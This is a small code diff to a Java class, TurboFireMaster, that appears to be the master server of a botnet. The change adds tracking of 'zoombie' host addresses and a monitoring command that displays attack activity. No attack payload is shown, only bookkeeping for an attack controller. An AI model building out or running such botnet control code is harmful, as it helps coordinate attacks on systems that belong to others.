@@ -82,6 +82,7 @@ public class TurboFireMaster {
     private AttackPattern attackPattern;
 
     private static List attackLogs;
+    private static ArrayList<String> zoombieHosts;
     /** 
      * The master turbo fire executable version
      * object constructor. It sets a gui instance,
@@ -90,10 +91,11 @@ public class TurboFireMaster {
      * master server.
     */
     public TurboFireMaster() {
-        this.gui = new GUI();
-        this.serverPort = 3425;
+        this.serverPort  = 3425;
+        this.gui         = new GUI();
         this.zoombieList = new ArrayList<Socket>();
-        attackLogs = new ArrayList<AttackPattern>();
+        zoombieHosts     = new ArrayList<String>();
+        attackLogs       = new ArrayList<AttackPattern>();
         startMaster();
     }
 
@@ -107,11 +109,11 @@ public class TurboFireMaster {
             this.gui.welcome("master", this.serverPort);
             String[] command = this.gui.getCommand();
             this.gui.clean();
-        if(command[0].equalsIgnoreCase("teste")) {
+        if(command[0].equalsIgnoreCase("monitoring")) {
                 while(true) {
                     try {
                         TimeUnit.SECONDS.sleep(1);
-                        GUI.showAttackActivity(attackLogs.size(), attackLogs);
+                        GUI.showAttackActivity(attackLogs.size(), attackLogs, getZoombieHosts());
                     } catch (InterruptedException ie) {
                         GUI.showExceptionLog(ie.toString());
                     }
@@ -219,4 +221,12 @@ public class TurboFireMaster {
     public static void addAttackLog(AttackPattern data) {
         attackLogs.add(data);
     }
+
+    public static ArrayList<String> getZoombieHosts() {
+        return zoombieHosts;
+    }
+
+    public static void addNewZoombieHost(String address) {
+        zoombieHosts.add(address);
+    } 
 }
